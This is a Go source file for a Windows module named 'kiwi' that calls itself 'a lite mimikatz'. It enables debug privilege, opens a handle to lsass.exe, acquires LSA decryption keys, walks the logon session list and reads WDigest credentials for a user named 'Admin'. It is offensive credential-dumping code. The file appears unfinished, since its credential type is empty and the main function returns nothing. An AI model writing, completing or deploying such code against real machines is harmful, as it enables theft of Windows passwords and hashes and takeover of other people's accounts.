// +build windows

package kiwi

import (
	"fmt"
	"runtime"
	"sync"

	"github.com/pkg/errors"

	"project/internal/logger"
	"project/internal/module/windows/api"
	"project/internal/module/windows/privilege"
	"project/internal/random"
)

// patchGeneric contains special data and offset.
type patchGeneric struct {
	search  *patchPattern
	patch   *patchPattern
	offsets *patchOffsets
}

type patchPattern struct {
	length int
	data   []byte
}

type patchOffsets struct {
	off0 int
	off1 int
	off2 int
	off3 int
}

// Kiwi is a lite mimikatz.
type Kiwi struct {
	logger logger.Logger

	rand *random.Rand

	// is get debug privilege
	debug bool

	// 0 = not read, 1 = true, 2 = false
	wow64 uint8

	// PID of lsass.exe
	pid uint32

	// version about windows
	major uint32
	minor uint32
	build uint32

	// modules about lsass.exe
	modules    []*basicModuleInfo
	modulesRWM sync.RWMutex

	// about decrypt
	iv          []byte
	hardKeyData []byte
	key3DES     *api.BcryptKey
	keyAES      *api.BcryptKey

	// address about logon session
	logonSessionListAddr      uintptr
	logonSessionListCountAddr uintptr

	wdigestPrimaryOffset int
	wdigestCredAddr      uintptr

	// lock above fields
	mu sync.Mutex
}

// NewKiwi is used to create a new kiwi module.
func NewKiwi(logger logger.Logger) (*Kiwi, error) {
	switch arch := runtime.GOARCH; arch {
	case "386", "amd64":
	default:
		return nil, errors.Errorf("current architecture %s is not supported", arch)
	}
	return &Kiwi{logger: logger, rand: random.NewRand()}, nil
}

func (kiwi *Kiwi) log(lv logger.Level, log ...interface{}) {
	kiwi.logger.Println(lv, "kiwi", log...)
}

func (kiwi *Kiwi) logf(lv logger.Level, format string, log ...interface{}) {
	kiwi.logger.Printf(lv, "kiwi", format, log...)
}

// EnableDebugPrivilege is used to enable debug privilege.
func (kiwi *Kiwi) EnableDebugPrivilege() error {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if kiwi.debug {
		return nil
	}
	err := privilege.EnableDebugPrivilege()
	if err != nil {
		return err
	}
	kiwi.debug = true
	return nil
}

// Credential contain information.
type Credential struct {
}

// GetAllCredential is used to get all credentials from lsass.exe memory.
func (kiwi *Kiwi) GetAllCredential() ([]*Credential, error) {
	// check is running on WOW64
	wow64, err := kiwi.isWow64()
	if err != nil {
		return nil, err
	}
	if wow64 {
		return nil, errors.New("can't access x64 process")
	}
	pid, err := kiwi.getLSASSProcessID()
	if err != nil {
		return nil, err
	}
	pHandle, err := kiwi.getLSASSHandle(pid)
	if err != nil {
		return nil, err
	}
	defer api.CloseHandle(pHandle)
	kiwi.logf(logger.Info, "process handle of lsass.exe is 0x%X", pHandle)

	kiwi.acquireNT6LSAKeys(pHandle)

	patch := lsaSrvX64References[buildWin10v1903]
	sessions, err := kiwi.getLogonSessionList(pHandle, patch)
	if err != nil {
		return nil, err
	}

	for _, session := range sessions {
		fmt.Println("Domain:", session.Domain)
		fmt.Println("Username:", session.Username)
		fmt.Println("Logon server:", session.LogonServer)
		fmt.Println("SID:", session.SID)
		fmt.Println()
		if session.Username == "Admin" {
			kiwi.getWdigestList(pHandle, session.LogonID)
		}

	}

	return nil, nil
}

// Close is used to close kiwi module TODO destroy key
func (kiwi *Kiwi) Close() {

}
